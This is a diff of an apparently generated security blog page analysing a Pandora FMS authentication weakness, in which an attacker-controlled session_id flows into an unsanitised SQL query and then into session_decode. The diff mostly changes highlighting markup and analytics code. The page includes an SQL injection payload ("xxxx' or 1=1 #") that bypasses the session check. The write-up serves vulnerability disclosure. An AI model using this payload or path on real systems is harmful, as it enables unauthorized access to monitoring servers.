@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.498676c34eb225e85357ab0ce19c3c1244f3bd0bf595e5684d1b9d50ea4fbc42.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1368,16 +1368,14 @@
 
     
   
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G6WT3WSKMH"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-G6WT3WSKMH', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G6WT3WSKMH', { 'anonymize_ip': false });
 }
 </script>
 
@@ -1729,7 +1727,7 @@ if (!doNotTrack) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1757,40 +1755,40 @@ if (!doNotTrack) {
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">...
-$user = new PandoraFMS\User([&#39;phpsessionid&#39; =&gt; $_REQUEST[&#39;session_id&#39;]]);
-if (check_login(false) === false) {
-    // Error handler.
-    ?&gt;
-<span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Access denied<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;styles/pandora.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;styles/pandora_minimal.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;styles/js/jquery-ui.min.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;styles/js/jquery-ui_custom.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/javascript&#39;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;javascript/pandora.js&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/javascript&#39;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;javascript/jquery-3.3.1.min.js&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Access is not granted<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-    <span class="cp">&lt;?php</span> <span class="nx">echoPhantomCallback</span><span class="p">();</span> <span class="cp">?&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-
-    <span class="cp">&lt;?php</span>
-    <span class="k">exit</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PandoraFMS\User</span><span class="p">([</span><span class="s1">&#39;phpsessionid&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">]]);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">check_login</span><span class="p">(</span><span class="k">false</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Error handler.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;Access denied&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;styles/pandora.css&#34; type=&#34;text/css&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;styles/pandora_minimal.css&#34; type=&#34;text/css&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;styles/js/jquery-ui.min.css&#34; type=&#34;text/css&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;styles/js/jquery-ui_custom.css&#34; type=&#34;text/css&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script language=&#34;javascript&#34; type=&#39;text/javascript&#39; src=&#39;javascript/pandora.js&#39;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script language=&#34;javascript&#34; type=&#39;text/javascript&#39; src=&#39;javascript/jquery-3.3.1.min.js&#39;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h1&gt;Access is not granted&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;?php echoPhantomCallback(); ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">    exit;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>At <strong>line 2,</strong> the <code>session_id</code> value is controlled by the attacker. Let’s delve deeper into the constructor function of the <code>PandoraFMS\User</code>class:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1846,68 +1844,68 @@ if (check_login(false) === false) {
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">public function __construct($data)
-    {
-        global $config;
-
-        // Unset user.
-        unset($config[&#39;id_usuario&#39;]);
-        unset($_SESSION[&#39;id_usuario&#39;]);
-
-        if (is_array($data) === true) {
-            if (isset($data[&#39;phpsessionid&#39;]) === true) {
-                $this-&gt;sessions[$data[&#39;phpsessionid&#39;]] = 1;
-                $info = \db_get_row_filter(
-                    &#39;tsessions_php&#39;,
-                    [&#39;id_session&#39; =&gt; $data[&#39;phpsessionid&#39;]]
-                );
-
-                if ($info !== false) {
-                    // Process.
-                    $session_data = session_decode($info[&#39;data&#39;]);
-                    $this-&gt;idUser = $_SESSION[&#39;id_usuario&#39;];
-
-                    // Valid session.
-                    return $this;
-                }
-
-                return null;
-            }
-
-            if (isset($data[&#39;id_usuario&#39;]) === true
-                <span class="err">&amp;&amp;</span> isset($data[&#39;password&#39;]) === true
-            ) {
-                $user_in_db = process_user_login($user, $password, true);
-                if ($user_in_db !== false) {
-                    $config[&#39;id_usuario&#39;] = $user_in_db;
-                    $correctLogin = true;
-
-                    // Originally at api.php.
-                    if (session_status() === PHP_SESSION_NONE) {
-                        session_start();
-                    }
-
-                    $_SESSION[&#39;id_usuario&#39;] = $user;
-                    session_write_close();
-
-                    $this-&gt;idUser = $data[&#39;id_usuario&#39;];
-                    // Valid session.
-                    return $this;
-                }
-            }
-        }
-
-        return null;
-
-    }
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Unset user.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">unset</span><span class="p">(</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessions</span><span class="p">[</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$info</span> <span class="o">=</span> <span class="nx">\db_get_row_filter</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;tsessions_php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="s1">&#39;id_session&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">                <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$info</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Process.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$session_data</span> <span class="o">=</span> <span class="nx">session_decode</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">idUser</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Valid session.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$user_in_db</span> <span class="o">=</span> <span class="nx">process_user_login</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$user_in_db</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_in_db</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$correctLogin</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Originally at api.php.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">if</span> <span class="p">(</span><span class="nx">session_status</span><span class="p">()</span> <span class="o">===</span> <span class="nx">PHP_SESSION_NONE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">session_write_close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">idUser</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Valid session.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
 <p>At lines 12-15, the <code>phpsessionid</code> value will be used as an argument for the <code>db_get_row_filter()</code> function. The output of the <code>db_get_row_filter()</code> function is saved in the <code>info</code> variable and <code>$info['data']</code> will be deserialized using the <code>session_decode()</code> fuction. Let’s delve deeper into the <code>db_get_row_filter</code> function:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1917,22 +1915,22 @@ if (check_login(false) === false) {
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function db_get_row_filter($table, $filter, $fields=false, $where_join=&#39;AND&#39;, $historydb=false)
-{
-    global $config;
-  
-    switch ($config[&#39;dbtype&#39;]) {
-        case &#39;mysql&#39;:
-        return mysql_db_get_row_filter($table, $filter, $fields, $where_join, $historydb);
-...
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">db_get_row_filter</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$fields</span><span class="o">=</span><span class="k">false</span><span class="p">,</span> <span class="nv">$where_join</span><span class="o">=</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span> <span class="nv">$historydb</span><span class="o">=</span><span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dbtype&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">mysql_db_get_row_filter</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="nv">$where_join</span><span class="p">,</span> <span class="nv">$historydb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
 <p>Because the database being used is MariaDB-mysql, let’s delve deeper into the <code>mysql_db_get_row_filter</code> function at line 7:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1958,31 +1956,31 @@ if (check_login(false) === false) {
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function mysql_db_get_row_filter($table, $filter, $fields=false, $where_join=&#39;AND&#39;, $historydb=false)
-{
-    if (empty($fields)) {
-        $fields = &#39;*&#39;;
-    } else {
-        if (is_array($fields)) {
-            $fields = implode(&#39;,&#39;, $fields);
-        } else if (! is_string($fields)) {
-            return false;
-        }
-    }
-  
-    if (is_array($filter)) {
-        $filter = db_format_array_where_clause_sql($filter, $where_join, &#39; WHERE &#39;);
-    } else if (is_string($filter)) {
-        $filter = &#39;WHERE &#39;.$filter;
-    } else {
-        $filter = &#39;&#39;;
-    }
-  
-    $sql = sprintf(&#39;SELECT %s FROM %s %s&#39;, $fields, $table, $filter);
-  
-    return db_get_row_sql($sql, $historydb);
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">mysql_db_get_row_filter</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$fields</span><span class="o">=</span><span class="k">false</span><span class="p">,</span> <span class="nv">$where_join</span><span class="o">=</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span> <span class="nv">$historydb</span><span class="o">=</span><span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fields</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fields</span> <span class="o">=</span> <span class="s1">&#39;*&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$fields</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$fields</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$fields</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filter</span> <span class="o">=</span> <span class="nx">db_format_array_where_clause_sql</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$where_join</span><span class="p">,</span> <span class="s1">&#39; WHERE &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;WHERE &#39;</span><span class="o">.</span><span class="nv">$filter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;SELECT %s FROM %s %s&#39;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="nv">$table</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">db_get_row_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$historydb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -2006,18 +2004,18 @@ if (check_login(false) === false) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">xxxx&#39; or 1=1 #
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">xxxx</span><span class="err">&#39;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">#
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Going deeper into the <code>db_get_row_sql</code>, we can see:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2030,18 +2028,18 @@ if (check_login(false) === false) {
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"> function db_get_row_sql($sql, $search_history_db=false)
-{
-    global $config;
-  
-    switch ($config[&#39;dbtype&#39;]) {
-        case &#39;mysql&#39;:
-        return mysql_db_get_row_sql($sql, $search_history_db);
-  
-            break;
-        case &#39;postgresql&#39;:
-        return postgresql_db_get_row_sql($sql, $search_history_db);
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">function</span> <span class="nf">db_get_row_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$search_history_db</span><span class="o">=</span><span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dbtype&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">mysql_db_get_row_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$search_history_db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;postgresql&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">postgresql_db_get_row_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$search_history_db</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>This program calls the <code>mysql_db_get_row_sql($sql, $search_history_db);</code> function since it utilizes the MYSQL database.</li>
@@ -2053,7 +2051,7 @@ if (check_login(false) === false) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2066,18 +2064,18 @@ if (check_login(false) === false) {
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function mysql_db_get_row_sql($sql, $search_history_db=false)
-{
-    $sql .= &#39; LIMIT 1&#39;;
-    $result = db_get_all_rows_sql($sql, $search_history_db);
-
-    if ($result === false) {
-        return false;
-    }
-
-    return $result[0];
-}
-</code></pre></td></tr></table>
